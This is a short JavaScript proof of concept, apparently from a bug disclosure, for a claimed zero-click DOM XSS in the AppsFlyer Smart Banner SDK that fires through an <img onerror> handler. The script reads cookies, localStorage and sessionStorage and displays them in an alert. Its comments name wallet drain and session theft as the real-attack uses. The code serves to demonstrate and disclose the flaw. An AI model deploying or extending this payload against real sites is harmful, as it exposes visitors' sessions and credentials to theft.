// AppsFlyer Smart Banner XSS PoC — s1n6h
// ZERO-CLICK DOM XSS: fires on page load via <img onerror> in creative layout
// The SDK injects layout via innerHTML with no sanitization
// <img src=x onerror="..."> fires automatically when the image fails to load
// No user interaction required — fires the moment the banner renders

(async () => {
  const data = {
    origin: window.location.origin,
    cookies: document.cookie || '(none)',
    localStorage: Object.keys(localStorage).length ? 
      JSON.stringify(Object.fromEntries(Object.entries(localStorage))).substring(0, 500) : '(empty)',
    sessionStorage: Object.keys(sessionStorage).length ? 
      JSON.stringify(Object.fromEntries(Object.entries(sessionStorage))).substring(0, 500) : '(empty)',
    userAgent: navigator.userAgent,
    timestamp: new Date().toISOString()
  };
  
  alert(
    'ZERO-CLICK XSS fired on: ' + data.origin + '\n\n' +
    'Cookies: ' + data.cookies + '\n\n' +
    'LocalStorage: ' + data.localStorage + '\n\n' +
    'No user interaction required. Fired on page load via <img onerror> in innerHTML.\n\n' +
    'In a real attack: wallet drain, session theft, credential exfiltration.'
  );
})();
